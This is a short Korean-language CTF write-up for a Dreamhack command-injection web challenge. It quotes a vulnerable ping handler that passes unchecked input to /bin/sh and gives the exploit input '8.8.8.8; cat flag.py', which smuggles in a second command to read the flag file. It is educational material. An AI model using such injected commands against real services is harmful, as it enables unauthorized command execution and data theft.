---
ctf_name: "Dreamhack"
challenge_name: "command-injection-chatgpt"
category: "web"
difficulty: "easy"
author: "sihyunkimm"
date: "2026-06-22"
points: 14
tags: [command injection, RCE]
---

# command-injection-chatgpt

## 문제 설명

> 특정 Host에 ping 패킷을 보내는 서비스입니다. Command Injection을 통해 플래그를 획득하세요. 플래그는 flag.py에 있습니다. chatGPT와 함께 풀어보세요!

- 접근: Dreamhack VM

## 풀이

### 분석

`app.py`의 핵심 코드:

```python
host = request.form.get('host')
cmd = f'ping -c 3 {host}'
output = subprocess.check_output(['/bin/sh', '-c', cmd], timeout=5)
```

사용자 입력 `host`를 검증 없이 f-string으로 쉘 명령어에 삽입하고 `/bin/sh -c`로 실행한다. 전형적인 Command Injection 취약점이다.

플래그는 `from flag import FLAG`로 임포트되므로 앱과 같은 디렉토리의 `flag.py`에 위치한다.

### 취약점

- `host` 파라미터에 `;` 등 쉘 구분자를 삽입하면 임의 명령 실행 가능
- 실행 결과가 응답에 그대로 포함되므로 출력 확인 가능

### 익스플로잇

`/ping`의 Host 입력란에 다음을 입력:

```
8.8.8.8; cat flag.py
```

실행되는 최종 명령:

```sh
ping -c 3 8.8.8.8; cat flag.py
```  

## 플래그

```
DH{REDACTED}
```

## 배운 점

- 명령어를 입력받을 때는 검증 절차가 필요하다.  
